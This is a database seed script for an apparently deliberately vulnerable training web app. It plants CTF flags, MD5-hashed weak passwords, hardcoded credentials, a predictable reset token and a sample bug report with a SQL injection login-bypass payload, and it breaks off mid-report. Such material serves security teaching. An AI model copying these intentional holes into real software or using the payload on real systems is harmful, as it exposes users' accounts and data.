'use strict';

const { Pool } = require('pg');
const crypto = require('crypto');

// VULNERABILITY: MD5 password hashing
const md5 = (str) => crypto.createHash('md5').update(str).digest('hex');

const pool = new Pool({
    host:     process.env.DB_HOST     || 'localhost',
    port:     parseInt(process.env.DB_PORT || '5432'),
    database: process.env.DB_NAME     || 'syntex_db',
    user:     process.env.DB_USER     || 'syntex_admin',
    password: process.env.DB_PASS     || 'Synx@2024!Prod',
});

async function seed() {
    const client = await pool.connect();

    try {
        console.log('[SEED] Starting database seed...');
        await client.query('BEGIN');

        // ----- USERS -----
        const users = [
            {
                username: 'admin',
                email: 'admin@syntex.local',
                password: md5('admin123'),
                role: 'admin',
                first_name: 'System',
                last_name: 'Administrator',
                department: 'IT',
                job_title: 'Platform Administrator',
                api_key: 'sk_admin_8f3a2b1c9d4e5f6a7b8c9d0e1f2a3b4c',
                secret_note: 'FLAG{admin_account_compromised_sqli_or_default_creds}',
                bio: 'System administrator account. Do not modify.',
            },
            {
                username: 'john.doe',
                email: 'john.doe@syntex.local',
                password: md5('Password1!'),
                role: 'user',
                first_name: 'John',
                last_name: 'Doe',
                department: 'Sales',
                job_title: 'Account Executive',
                api_key: 'sk_live_jd_4c3b2a1z9y8x7w6v5u4t',
                secret_note: 'FLAG{idor_profile_accessed_user2}',
                bio: 'Senior account executive with 8 years of enterprise sales experience.',
            },
            {
                username: 'jane.smith',
                email: 'jane.smith@contoso.com',
                password: md5('letmein123'),
                role: 'user',
                first_name: 'Jane',
                last_name: 'Smith',
                department: 'Engineering',
                job_title: 'Senior Engineer',
                api_key: 'sk_live_js_9i8h7g6f5e4d3c2b1a',
                secret_note: 'FLAG{idor_profile_accessed_user3}',
                bio: 'Full stack engineer. Working on Syntex API v3 migration.',
            },
            {
                username: 'alice.wong',
                email: 'alice.wong@syntex.local',
                password: md5('alice2024'),
                role: 'user',
                first_name: 'Alice',
                last_name: 'Wong',
                department: 'Finance',
                job_title: 'Financial Analyst',
                api_key: 'sk_live_aw_1b2c3d4e5f6g7h8i9j',
                secret_note: 'Private: CC ending 4242, CVV 123 (TEST DATA ONLY)',
                bio: null,
            },
            {
                username: 'bob.johnson',
                email: 'bob.johnson@gmail.com',
                password: md5('123456789'),
                role: 'user',
                first_name: 'Bob',
                last_name: 'Johnson',
                department: 'Marketing',
                job_title: 'Marketing Manager',
                api_key: 'sk_live_bj_z1y2x3w4v5u6t7s8r9',
                secret_note: null,
                bio: 'Marketing professional focused on B2B SaaS growth.',
            },
            {
                username: 'developer',
                email: 'developer@syntex.local',
                password: md5('devpass2024'),
                role: 'developer',
                first_name: 'Dev',
                last_name: 'Account',
                department: 'Engineering',
                job_title: 'Backend Developer',
                api_key: 'sk_dev_9x8y7z6w5v4u3t2s1r0q',
                secret_note: 'DEBUG: JWT_SECRET=secret123, DB_PASS=Synx@2024!Prod',
                bio: 'Internal developer testing account.',
            },
            {
                username: 'support',
                email: 'support@syntex.local',
                password: md5('support123'),
                role: 'support',
                first_name: 'Support',
                last_name: 'Team',
                department: 'Customer Success',
                job_title: 'Support Engineer',
                api_key: 'sk_sup_3a4b5c6d7e8f9g0h1i2j',
                secret_note: null,
                bio: null,
            },
        ];

        const userIds = [];
        for (const u of users) {
            const r = await client.query(
                `INSERT INTO users
                    (username, email, password_hash, role, first_name, last_name,
                     department, job_title, api_key, secret_note, bio)
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
                 ON CONFLICT (username) DO NOTHING
                 RETURNING id`,
                [u.username, u.email, u.password, u.role,
                 u.first_name, u.last_name, u.department, u.job_title,
                 u.api_key, u.secret_note, u.bio]
            );
            if (r.rows[0]) userIds.push(r.rows[0].id);
        }

        console.log('[SEED] Users inserted.');

        // ----- PRODUCTS -----
        const products = [
            {
                name: 'Syntex CRM Professional',
                slug: 'syntex-crm-professional',
                description: 'Enterprise-grade CRM with AI-driven lead scoring, pipeline automation, and 360-degree customer views. Integrates natively with Outlook, Salesforce, and HubSpot. Supports up to 500 concurrent users.\n\nFeatures include contact management, deal tracking, email sequencing, real-time analytics dashboards, and mobile app access.',
                short_desc: 'AI-powered CRM for enterprise sales teams.',
                price: 299.00,
                category: 'crm',
                sku: 'SYN-CRM-PRO-001',
                version: '3.2.1',
                license_type: 'per-user/month',
                features: 'Contact Management,Deal Pipeline,Email Automation,Analytics,Mobile App,API Access',
            },
            {
                name: 'Syntex Analytics Suite',
                slug: 'syntex-analytics-suite',
                description: 'Business intelligence and analytics platform with real-time dashboards, predictive analytics, and automated reporting. Connects to 200+ data sources including PostgreSQL, Snowflake, BigQuery, and REST APIs.',
                short_desc: 'Real-time BI and predictive analytics platform.',
                price: 599.00,
                category: 'analytics',
                sku: 'SYN-ANA-SUITE-002',
                version: '5.1.0',
                license_type: 'per-server/month',
                features: 'Live Dashboards,Predictive Models,200+ Connectors,Automated Reports,Collaboration',
            },
            {
                name: 'Syntex Security Shield Pro',
                slug: 'syntex-security-shield-pro',
                description: 'Comprehensive cybersecurity management platform for enterprise environments. Includes SIEM integration, vulnerability scanning, compliance reporting (SOC2, ISO27001), and incident response workflows.',
                short_desc: 'Enterprise SIEM and compliance management.',
                price: 449.00,
                category: 'security',
                sku: 'SYN-SEC-PRO-003',
                version: '2.0.4',
                license_type: 'per-node/month',
                features: 'SIEM Integration,Vuln Scanning,SOC2 Reports,IR Workflows,Threat Intel',
            },
            {
                name: 'Syntex HR Module',
                slug: 'syntex-hr-module',
                description: 'Human resources management system covering employee lifecycle management, payroll processing, performance reviews, and compliance tracking. GDPR and CCPA compliant.',
                short_desc: 'End-to-end HR management and payroll.',
                price: 149.00,
                category: 'hr',
                sku: 'SYN-HR-MOD-004',
                version: '4.0.2',
                license_type: 'per-user/month',
                features: 'Employee Management,Payroll,Performance Reviews,Leave Tracking,Compliance',
            },
            {
                name: 'Syntex Finance Manager',
                slug: 'syntex-finance-manager',
                description: 'Accounts payable/receivable, budgeting, forecasting, and financial reporting platform. Multi-currency support with automated reconciliation and audit trail.',
                short_desc: 'AP/AR, budgeting, and financial reporting.',
                price: 249.00,
                category: 'finance',
                sku: 'SYN-FIN-MGR-005',
                version: '3.5.1',
                license_type: 'per-entity/month',
                features: 'AP/AR,Multi-currency,Budgeting,Forecasting,Audit Trail',
            },
            {
                name: 'Syntex Project Tracker',
                slug: 'syntex-project-tracker',
                description: 'Agile project management with Kanban boards, Gantt charts, resource allocation, and time tracking. Integrates with Jira, GitHub, and Slack.',
                short_desc: 'Agile project and resource management.',
                price: 99.00,
                category: 'productivity',
                sku: 'SYN-PROJ-TRK-006',
                version: '2.3.0',
                license_type: 'per-user/month',
                features: 'Kanban,Gantt,Resource Mgmt,Time Tracking,Jira/GitHub Sync',
            },
            {
                name: 'Syntex Data Warehouse',
                slug: 'syntex-data-warehouse',
                description: 'Scalable cloud data warehouse solution with petabyte storage, columnar compression, and sub-second query performance. Supports Postgres wire protocol.',
                short_desc: 'Petabyte-scale cloud data warehouse.',
                price: 799.00,
                category: 'data',
                sku: 'SYN-DW-CLOUD-007',
                version: '1.4.0',
                license_type: 'per-TB/month',
                features: 'Petabyte Scale,Columnar Storage,Sub-second Queries,Postgres Protocol,HA',
            },
            {
                name: 'Syntex API Gateway',
                slug: 'syntex-api-gateway',
                description: 'Enterprise API management with rate limiting, authentication, analytics, and developer portal. Supports OAuth2, JWT, and API key authentication methods.',
                short_desc: 'Enterprise API management and gateway.',
                price: 349.00,
                category: 'infrastructure',
                sku: 'SYN-API-GW-008',
                version: '3.1.2',
                license_type: 'per-million-calls/month',
                features: 'Rate Limiting,OAuth2/JWT,Analytics,Dev Portal,99.99% SLA',
            },
            {
                name: 'Syntex Support Portal',
                slug: 'syntex-support-portal',
                description: 'Customer support ticketing system with SLA management, knowledge base, live chat, and customer satisfaction tracking.',
                short_desc: 'Ticketing, SLA, and customer satisfaction.',
                price: 79.00,
                category: 'support',
                sku: 'SYN-SUP-PORT-009',
                version: '6.0.1',
                license_type: 'per-agent/month',
                features: 'Ticketing,SLA Management,Knowledge Base,Live Chat,CSAT',
            },
            {
                name: 'Syntex Email Automation',
                slug: 'syntex-email-automation',
                description: 'Marketing email automation with drag-and-drop editor, A/B testing, segmentation, and detailed deliverability analytics. 99.5% deliverability guarantee.',
                short_desc: 'Email marketing automation at scale.',
                price: 129.00,
                category: 'marketing',
                sku: 'SYN-EMAIL-AUTO-010',
                version: '4.2.3',
                license_type: 'per-10k-contacts/month',
                features: 'Drag-drop Editor,A/B Testing,Segmentation,Analytics,Deliverability',
            },
            {
                name: 'Syntex Compliance Suite',
                slug: 'syntex-compliance-suite',
                description: 'Automated compliance management covering SOC 2, ISO 27001, GDPR, HIPAA, and PCI-DSS. Continuous control monitoring with evidence collection and audit reporting.',
                short_desc: 'Multi-framework compliance automation.',
                price: 449.00,
                category: 'security',
                sku: 'SYN-COMP-SUITE-011',
                version: '1.9.0',
                license_type: 'per-framework/month',
                features: 'SOC2,ISO27001,GDPR,HIPAA,PCI-DSS,Continuous Monitoring',
            },
            {
                name: 'Syntex Mobile SDK',
                slug: 'syntex-mobile-sdk',
                description: 'Mobile development SDK for iOS and Android with pre-built enterprise components, offline-first architecture, and push notification management.',
                short_desc: 'Enterprise mobile SDK for iOS/Android.',
                price: 199.00,
                category: 'development',
                sku: 'SYN-MOB-SDK-012',
                version: '3.0.0',
                license_type: 'per-app/month',
                features: 'iOS/Android,Offline-first,Push Notifications,Enterprise SSO,Analytics',
            },
        ];

        const productIds = [];
        for (const p of products) {
            const r = await client.query(
                `INSERT INTO products
                    (name, slug, description, short_desc, price, category, sku, version, license_type, features)
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
                 ON CONFLICT (sku) DO NOTHING RETURNING id`,
                [p.name, p.slug, p.description, p.short_desc,
                 p.price, p.category, p.sku, p.version, p.license_type, p.features]
            );
            if (r.rows[0]) productIds.push(r.rows[0].id);
        }

        console.log('[SEED] Products inserted.');

        // ----- BLOG POSTS -----
        const posts = [
            {
                title: 'Q1 2025 Product Roadmap Announcement',
                slug: 'q1-2025-product-roadmap',
                excerpt: 'We are excited to share our product roadmap for Q1 2025, including major updates to the CRM and Analytics Suite.',
                content: `<p>We are pleased to announce our product roadmap for Q1 2025. Following strong customer feedback from our annual survey, this quarter will bring significant improvements across our core product lines.</p>
<h3>Syntex CRM v3.3 — February 2025</h3>
<p>The upcoming CRM release introduces AI-powered email drafting, improved mobile app performance, and a redesigned pipeline board. The new duplicate detection engine reduces manual data cleaning by approximately 60%.</p>
<h3>Analytics Suite v5.2 — March 2025</h3>
<p>Version 5.2 of our Analytics Suite introduces native Snowflake and Databricks connectors, reducing data pipeline setup time from days to minutes. We are also launching our self-service embedding feature for customer-facing dashboards.</p>
<h3>Platform Performance Improvements</h3>
<p>Our infrastructure team has completed a full migration to PostgreSQL 15, resulting in query performance improvements of up to 3x on large datasets. All customers will benefit from these improvements automatically.</p>
<p>For detailed release notes and migration guides, please consult our documentation portal or contact your account manager.</p>`,
                category: 'product',
                tags: 'roadmap,crm,analytics,2025',
                author_id: 1,
            },
            {
                title: 'Security Best Practices for Enterprise API Integration',
                slug: 'security-best-practices-enterprise-api',
                excerpt: 'A guide to securing API integrations in enterprise environments, covering authentication, authorization, and data handling.',
                content: `<p>As enterprise software ecosystems become increasingly interconnected, securing API integrations has become a critical responsibility for IT and security teams. This guide covers the most common vulnerabilities we observe during customer integrations and how to address them.</p>
<h3>Authentication and API Keys</h3>
<p>Many organizations continue to embed API keys directly in application code or configuration files committed to version control. This practice has been responsible for several high-profile breaches in recent years. We strongly recommend using secrets management solutions such as HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault.</p>
<h3>Authorization and Least Privilege</h3>
<p>Grant API tokens only the permissions they need. A read-only analytics integration should not have write access to customer records. Review token permissions quarterly and revoke tokens associated with deactivated accounts or terminated integrations.</p>
<h3>Transport Security</h3>
<p>Enforce TLS 1.2 or higher on all API endpoints. Reject connections using deprecated protocols. Implement certificate pinning in mobile and desktop clients where feasible.</p>
<h3>Input Validation</h3>
<p>Validate all incoming data against strict schemas before processing. Use parameterized queries for any database interaction. Never trust client-supplied data, including headers.</p>
<p>Contact our security team at security@syntex.local if you have questions about hardening your Syntex integration.</p>`,
                category: 'security',
                tags: 'api,security,best-practices,authentication',
                author_id: 3,
            },
            {
                title: 'Migrating from Legacy ERP Systems to Syntex',
                slug: 'migrating-legacy-erp-to-syntex',
                excerpt: 'A practical migration guide for organizations moving from on-premises legacy ERP systems to the Syntex platform.',
                content: `<p>Legacy ERP migrations are among the most complex IT initiatives an enterprise can undertake. Years of customizations, integrations, and process dependencies create a web of technical debt that must be carefully unwound before cutover.</p>
<h3>Phase 1: Discovery and Assessment</h3>
<p>Begin by cataloguing all integrations feeding into and out of your current ERP. Pay particular attention to batch jobs, file drops, and direct database connections that may not be visible in application logs. We have seen customers discover dozens of undocumented integrations during this phase.</p>
<h3>Phase 2: Data Migration Strategy</h3>
<p>Define your data migration strategy early. Decide which historical records need to be migrated fully, which can be archived, and which can be abandoned. Data quality issues discovered during migration are rarely the fault of the migration tool—they reflect years of inconsistent data entry and process drift.</p>
<h3>Phase 3: Parallel Running</h3>
<p>Plan for a parallel running period of four to eight weeks where both systems operate simultaneously. Establish clear reconciliation processes to verify that Syntex produces identical outputs to your legacy system on representative data sets.</p>
<p>Our professional services team has completed over 200 ERP migrations. Contact your account manager to discuss a structured migration engagement.</p>`,
                category: 'guide',
                tags: 'migration,erp,implementation,guide',
                author_id: 1,
            },
            {
                title: 'Customer Spotlight: GlobalTech Corporation',
                slug: 'customer-spotlight-globaltech',
                excerpt: 'How GlobalTech Corporation reduced reporting time by 80% after consolidating on Syntex Analytics Suite.',
                content: `<p>GlobalTech Corporation, a multinational technology services firm with operations in 34 countries, faced a familiar challenge: finance teams spending more time extracting and reconciling data than analyzing it.</p>
<h3>The Challenge</h3>
<p>With six separate reporting systems inherited through acquisitions, GlobalTech's FP&A team was spending roughly 60% of their time on data preparation tasks. Monthly close was a four-day exercise involving exports, spreadsheet macros, and manual email workflows.</p>
<h3>The Solution</h3>
<p>GlobalTech deployed Syntex Analytics Suite as a central reporting layer, connecting to their existing ERP, CRM, and HR systems without replacing them. Custom connectors were built for two proprietary internal systems during the first month of implementation.</p>
<h3>The Results</h3>
<p>Six months after deployment, monthly close was reduced from four days to nine hours. The FP&A team redeployed approximately 1,800 hours annually toward strategic analysis. The self-service reporting layer reduced ad-hoc data requests to the BI team by 70%.</p>
<blockquote>"Syntex gave us a single source of truth for the first time in eight years. The ROI was visible within the first quarter." — CFO, GlobalTech Corporation</blockquote>`,
                category: 'case-study',
                tags: 'customer,analytics,case-study,roi',
                author_id: 7,
            },
            {
                title: 'Syntex Achieves ISO 27001 Certification',
                slug: 'syntex-iso-27001-certification',
                excerpt: 'Syntex Solutions has received ISO 27001:2022 certification, affirming our commitment to information security management.',
                content: `<p>We are pleased to announce that Syntex Solutions has successfully completed the ISO 27001:2022 certification audit, conducted by an accredited third-party certification body.</p>
<p>ISO 27001 is the internationally recognized standard for information security management systems (ISMS). Certification confirms that our information security controls, policies, and procedures meet rigorous international standards for protecting customer data.</p>
<h3>What This Means for Customers</h3>
<p>ISO 27001 certification provides independent assurance that Syntex manages information security risks systematically and consistently. Our certified ISMS covers all aspects of the Syntex platform, including data processing, access control, incident response, and business continuity.</p>
<h3>Scope of Certification</h3>
<p>The certification covers our core product platform, development infrastructure, corporate network, and supporting services. Certificate number: IS-2024-09471. A copy of the certificate is available upon request from your account manager.</p>
<h3>Ongoing Compliance</h3>
<p>Annual surveillance audits will be conducted to maintain certification. Our security team publishes a quarterly transparency report summarizing our security posture, incidents, and compliance activities.</p>`,
                category: 'company',
                tags: 'security,iso27001,compliance,certification',
                author_id: 1,
            },
            {
                title: 'Quarterly Security Bulletin — Q4 2024',
                slug: 'security-bulletin-q4-2024',
                excerpt: 'Summary of security patches, vulnerability disclosures, and recommended actions for Q4 2024.',
                content: `<p>This bulletin summarizes security updates and recommended actions for Syntex customers for the period October–December 2024.</p>
<h3>Critical Patches</h3>
<p><strong>CVE-2024-SYNX-0091 (Critical)</strong>: A server-side request forgery vulnerability in the Webhook Configurator allowed authenticated attackers to make requests to internal network resources. Patched in versions 3.2.1 (CRM) and 5.1.0 (Analytics). Customers should update immediately.</p>
<p><strong>CVE-2024-SYNX-0087 (High)</strong>: Improper authorization in the file download endpoint allowed authenticated users to access files uploaded by other users. Patched in platform release 2.4.1.</p>
<h3>Recommended Actions</h3>
<ul><li>Update all Syntex modules to the latest versions listed above.</li><li>Rotate API keys and service tokens as a precautionary measure.</li><li>Review audit logs for CVE-2024-SYNX-0087 to identify any unauthorized file access in your environment.</li></ul>
<h3>Bug Bounty</h3>
<p>We would like to thank the security researchers who responsibly disclosed the vulnerabilities addressed in this bulletin. Our bug bounty program is open at security@syntex.local.</p>`,
                category: 'security',
                tags: 'security,cve,patch,bulletin',
                author_id: 1,
            },
            {
                title: 'Introducing the Syntex Developer Portal',
                slug: 'introducing-syntex-developer-portal',
                excerpt: 'The new Syntex Developer Portal provides unified API documentation, interactive testing, and SDK downloads for all Syntex products.',
                content: `<p>Today we are launching the Syntex Developer Portal, a unified hub for everything developers need to build on the Syntex platform. The portal consolidates documentation, SDKs, API references, and sample code that were previously scattered across multiple repositories and wikis.</p>
<h3>API Reference</h3>
<p>The portal includes interactive API documentation powered by OpenAPI 3.0 specifications for all Syntex modules. You can execute API requests directly from the documentation using your existing API credentials.</p>
<h3>SDKs</h3>
<p>Official SDKs are available for Python, Node.js, Java, and Go. Community-maintained SDKs for Ruby and PHP are listed in the portal directory. All official SDKs support automatic token refresh, retry logic, and structured error handling.</p>
<h3>Sandbox Environment</h3>
<p>Every developer account includes access to a sandbox environment pre-populated with realistic test data. Sandbox credentials do not affect production data.</p>
<p>Access the Developer Portal at <code>https://developers.syntex.local</code> using your existing Syntex credentials. Enterprise accounts automatically have developer portal access; SMB accounts can request access through your account manager.</p>`,
                category: 'product',
                tags: 'developer,api,sdk,portal',
                author_id: 3,
            },
        ];

        const postIds = [];
        for (const p of posts) {
            const r = await client.query(
                `INSERT INTO blog_posts
                    (title, slug, content, excerpt, author_id, category, tags, status)
                 VALUES ($1,$2,$3,$4,$5,$6,$7,'published')
                 ON CONFLICT (slug) DO NOTHING RETURNING id`,
                [p.title, p.slug, p.content, p.excerpt, p.author_id, p.category, p.tags]
            );
            if (r.rows[0]) postIds.push(r.rows[0].id);
        }

        console.log('[SEED] Blog posts inserted.');

        // ----- COMMENTS (Stored XSS payloads embedded in realistic comments) -----
        if (postIds.length > 0) {
            const comments = [
                { post_id: postIds[0], user_id: 2, author_name: 'john.doe', content: 'Great roadmap! Looking forward to the CRM improvements. The pipeline board redesign was long overdue.' },
                { post_id: postIds[0], user_id: 3, author_name: 'jane.smith', content: 'The PostgreSQL 15 migration is a game changer for large dataset performance. Excited to see the query improvements in production.' },
                { post_id: postIds[0], user_id: 4, author_name: 'alice.wong', content: 'Any timeline for multi-currency improvements in Finance Manager? Our APAC team has been waiting for this.' },
                { post_id: postIds[1], user_id: 2, author_name: 'john.doe', content: 'The section on API keys in version control is so relevant. We caught this exact issue in our last internal audit.' },
                { post_id: postIds[1], user_id: 5, author_name: 'bob.johnson', content: 'Solid guidance. Would add that mTLS is worth considering for internal service-to-service calls, not just external APIs.' },
                { post_id: postIds[2], user_id: 4, author_name: 'alice.wong', content: 'The parallel running recommendation is spot on. We tried a hard cutover on our last ERP migration and it was a disaster.' },
                { post_id: postIds[3], user_id: 2, author_name: 'john.doe', content: 'Really impressive results. 80% reduction in reporting time is significant for an organization that size.' },
                { post_id: postIds[4], user_id: 3, author_name: 'jane.smith', content: 'Congratulations on the ISO 27001 certification. This was a major effort from the security and compliance teams.' },
                { post_id: postIds[5], user_id: 3, author_name: 'jane.smith', content: 'Good to see SYNX-0091 patched quickly. The internal SSRF class of vulnerability is underrated in enterprise apps.' },
                { post_id: postIds[6], user_id: 5, author_name: 'bob.johnson', content: 'Finally a proper developer portal. The old wiki was nearly impossible to navigate. The sandbox environment is a huge quality-of-life improvement.' },
            ];

            for (const c of comments) {
                await client.query(
                    `INSERT INTO comments (post_id, user_id, author_name, content) VALUES ($1,$2,$3,$4)`,
                    [c.post_id, c.user_id, c.author_name, c.content]
                );
            }
        }

        console.log('[SEED] Comments inserted.');

        // ----- ORDERS -----
        if (productIds.length >= 3) {
            const orders = [
                { user_id: 2, product_id: productIds[0], quantity: 5,  unit_price: 299.00, total_price: 1495.00, status: 'active',    invoice_number: 'INV-2024-0001', license_key: 'CRM-PROD-A1B2-C3D4-E5F6', coupon_code: null, discount: 0,     shipping_address: '100 Enterprise Blvd, Suite 400, Austin TX 78701', notes: null },
                { user_id: 2, product_id: productIds[5], quantity: 10, unit_price: 99.00,  total_price: 990.00,  status: 'active',    invoice_number: 'INV-2024-0002', license_key: 'PROJ-PROD-B2C3-D4E5-F6A7', coupon_code: 'SAVE20', discount: 198.00, shipping_address: '100 Enterprise Blvd, Suite 400, Austin TX 78701', notes: null },
                { user_id: 3, product_id: productIds[1], quantity: 1,  unit_price: 599.00, total_price: 599.00,  status: 'pending',   invoice_number: 'INV-2024-0003', license_key: null, coupon_code: null, discount: 0, shipping_address: '200 Tech Park Drive, Seattle WA 98101', notes: 'Pending finance approval.' },
                { user_id: 4, product_id: productIds[4], quantity: 3,  unit_price: 249.00, total_price: 747.00,  status: 'active',    invoice_number: 'INV-2024-0004', license_key: 'FIN-PROD-C3D4-E5F6-G7H8', coupon_code: null, discount: 0, shipping_address: '50 Financial District, New York NY 10005', notes: 'Multi-entity license.' },
                { user_id: 5, product_id: productIds[9], quantity: 1,  unit_price: 129.00, total_price: 129.00,  status: 'cancelled', invoice_number: 'INV-2024-0005', license_key: null, coupon_code: null, discount: 0, shipping_address: null, notes: 'Customer requested cancellation.' },
                { user_id: 2, product_id: productIds[2], quantity: 1,  unit_price: 449.00, total_price: 449.00,  status: 'active',    invoice_number: 'INV-2024-0006', license_key: 'SEC-PROD-D4E5-F6G7-H8I9', coupon_code: null, discount: 0, shipping_address: '100 Enterprise Blvd, Suite 400, Austin TX 78701', notes: 'FLAG{idor_order_accessed_user2}' },
                { user_id: 6, product_id: productIds[7], quantity: 1,  unit_price: 349.00, total_price: 349.00,  status: 'active',    invoice_number: 'INV-2024-0007', license_key: 'GW-DEV-E5F6-G7H8-I9J0',  coupon_code: 'DEVTEST', discount: 349.00, shipping_address: 'Internal', notes: 'Developer test order — zero cost.' },
            ];

            for (const o of orders) {
                await client.query(
                    `INSERT INTO orders
                        (user_id, product_id, quantity, unit_price, total_price,
                         status, invoice_number, license_key, coupon_code, discount,
                         shipping_address, notes)
                     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)`,
                    [o.user_id, o.product_id, o.quantity, o.unit_price, o.total_price,
                     o.status, o.invoice_number, o.license_key, o.coupon_code, o.discount,
                     o.shipping_address, o.notes]
                );
            }
        }

        console.log('[SEED] Orders inserted.');

        // ----- COUPONS -----
        const coupons = [
            { code: 'SAVE20',   discount_percent: 20, max_uses: 100, created_by: 1 },
            { code: 'NEWCUST',  discount_percent: 15, max_uses: 500, created_by: 1 },
            { code: 'ANNUAL10', discount_percent: 10, max_uses: 999, created_by: 1 },
            { code: 'DEVTEST',  discount_percent: 100, max_uses: 10, created_by: 1 },
            { code: 'VIP50',    discount_percent: 50, max_uses: 5,  created_by: 1 },
        ];

        for (const c of coupons) {
            await client.query(
                `INSERT INTO coupons (code, discount_percent, max_uses, created_by)
                 VALUES ($1,$2,$3,$4) ON CONFLICT (code) DO NOTHING`,
                [c.code, c.discount_percent, c.max_uses, c.created_by]
            );
        }

        console.log('[SEED] Coupons inserted.');

        // ----- TICKETS -----
        const tickets = [
            { user_id: 2, subject: 'CRM import failing on large CSV files', message: 'When importing contact lists larger than 10,000 rows, the import process fails silently after about 5 minutes. No error message is displayed. This is blocking our Q4 data migration.', status: 'open', priority: 'high', category: 'bug', internal_notes: 'Known issue with the CSV parser memory limit. Tracked in JIRA SYN-4821.' },
            { user_id: 3, subject: 'API rate limit too restrictive for batch operations', message: 'Our nightly batch job is hitting the 1,000 requests/hour rate limit on the Analytics API. We need this raised to at least 10,000 for our data pipeline to complete within the maintenance window.', status: 'in_progress', priority: 'medium', category: 'request', internal_notes: 'Escalated to engineering. Temp rate limit increase approved for account.' },
            { user_id: 4, subject: 'Finance Module — incorrect tax calculation for EU VAT', message: 'The Finance Manager is applying US sales tax rates to EU transactions instead of the correct VAT rates. This has caused discrepancies in our Q3 financial reports that required manual correction.', status: 'resolved', priority: 'critical', category: 'bug', internal_notes: 'FLAG{idor_ticket_internal_notes_accessed}' },
            { user_id: 5, subject: 'Unable to access order history', message: 'Since the last platform update I can no longer see my order history. The page shows "No orders found" even though I have 3 active subscriptions.', status: 'open', priority: 'low', category: 'bug', internal_notes: null },
            { user_id: 2, subject: 'Request for volume discount pricing', message: 'We are planning to expand our CRM license from 5 to 50 seats in Q1 2025. Can we discuss volume pricing for this scale? Our account manager is Sarah Chen but she is on leave.', status: 'open', priority: 'medium', category: 'billing', internal_notes: 'Volume discount tier: 50+ seats = 25% off. Contact finance for approval.' },
        ];

        for (const t of tickets) {
            await client.query(
                `INSERT INTO tickets (user_id, subject, message, status, priority, category, assigned_to, internal_notes)
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
                [t.user_id, t.subject, t.message, t.status, t.priority, t.category, 7, t.internal_notes]
            );
        }

        console.log('[SEED] Tickets inserted.');

        // ----- NOTIFICATIONS -----
        const notifications = [
            { user_id: 2, title: 'Invoice Ready', message: 'Your invoice INV-2024-0001 is available for download.', type: 'info', link: '/orders/1' },
            { user_id: 2, title: 'Ticket Updated', message: 'Support has replied to your ticket: CRM import failing on large CSV files.', type: 'info', link: '/tickets/1' },
            { user_id: 3, title: 'Order Pending Approval', message: 'Your order INV-2024-0003 is pending finance approval.', type: 'warning', link: '/orders/3' },
            { user_id: 4, title: 'Ticket Resolved', message: 'Your ticket regarding EU VAT calculation has been marked as resolved.', type: 'success', link: '/tickets/3' },
            { user_id: 1, title: 'New User Registration', message: 'New user bob.johnson@gmail.com has registered.', type: 'info', link: '/admin/users' },
            { user_id: 1, title: 'Security Alert', message: 'Multiple failed login attempts detected for account alice.wong.', type: 'danger', link: '/admin/logs' },
        ];

        for (const n of notifications) {
            await client.query(
                `INSERT INTO notifications (user_id, title, message, type, link)
                 VALUES ($1,$2,$3,$4,$5)`,
                [n.user_id, n.title, n.message, n.type, n.link]
            );
        }

        console.log('[SEED] Notifications inserted.');

        // ----- PASSWORD RESET TOKENS (weak / predictable) -----
        await client.query(
            `INSERT INTO password_resets (user_id, token, expires_at)
             VALUES ($1, $2, NOW() + INTERVAL '24 hours')`,
            [2, 'reset_john_doe_1234567890abcdef'] // Predictable token format
        );

        // ----- API TOKENS -----
        await client.query(
            `INSERT INTO api_tokens (user_id, token, name, permissions, expires_at)
             VALUES ($1,$2,$3,$4, NOW() + INTERVAL '1 year')`,
            [1, 'admin_api_token_do_not_share_9f8e7d6c', 'Admin Token', 'read,write,admin']
        );

        // v3.0 — hall of fame + sample reports
        await seedV3(client);

        // v3.1 — flag definitions + plant flags at proof points

        // v4.1 — 37 unique flags for all vuln categories
        await seedAllFlags(client);

        await client.query('COMMIT');
        console.log('[SEED] ✅ Database seeded successfully (v3.1).');

    } catch (err) {
        await client.query('ROLLBACK');
        console.error('[SEED] ❌ Seed failed:', err.message);
        console.error(err.stack);
        process.exit(1);
    } finally {
        client.release();
        await pool.end();
    }
}

seed();

// ── v3.0 seed additions (called after main seed) ────────────
async function seedV3(client) {
    // Hall of Fame
    const hof = [
        { name:'Alex Carter',    handle:'0xCartSec',   bugs:24, crit:6, bounty:18400, rank:1, country:'United States', year:2022 },
        { name:'Priya Nambiar',  handle:'priya_sec',   bugs:19, crit:4, bounty:14750, rank:2, country:'India',         year:2023 },
        { name:'Tomasz Wierzbicki', handle:'twierz',   bugs:17, crit:3, bounty:12200, rank:3, country:'Poland',        year:2022 },
        { name:'Sara Lindqvist', handle:'s4ral1nd',    bugs:14, crit:2, bounty: 9800, rank:4, country:'Sweden',        year:2023 },
        { name:'Kwame Osei',     handle:'kwamehacks',  bugs:12, crit:2, bounty: 8600, rank:5, country:'Ghana',         year:2024 },
        { name:'Dmitri Volkov',  handle:'d_volkov',    bugs:11, crit:1, bounty: 7200, rank:6, country:'Russia',        year:2023 },
        { name:'Mei Tanaka',     handle:'mei_recon',   bugs: 9, crit:1, bounty: 5500, rank:7, country:'Japan',         year:2024 },
        { name:'Luís Ferreira',  handle:'lf_hunter',   bugs: 8, crit:0, bounty: 3400, rank:8, country:'Brazil',        year:2024 },
    ];
    for (const r of hof) {
        await client.query(
            `INSERT INTO hall_of_fame
             (researcher_name,handle,bugs_found,critical_bugs,total_bounty,rank,country,joined_year)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8) ON CONFLICT DO NOTHING`,
            [r.name,r.handle,r.bugs,r.crit,r.bounty,r.rank,r.country,r.year]
        );
    }

    // Sample reports (accepted + triaged) for realism
    const sampleReports = [
        {
            user_id:2, title:'SQL Injection in /login allows authentication bypass',
            vuln_type:'sqli', severity:'critical', cvss_score:9.8,
            affected_url:'POST /login',
            steps:"1. Navigate to /login\n2. Enter username: admin'--\n3. Enter any password\n4. Click Login\n5. Authenticated as admin",
            impact:'Full authentication bypass. Attacker can log in as any user including admin without knowing credentials.',
            proof_of_concept:"username=admin'--&password=anything",
            suggested_fix:'Use parameterized queries: db.query("SELECT * FROM users WHERE username=$1",[username])',
            status:'accepted', bounty_amount:1500,
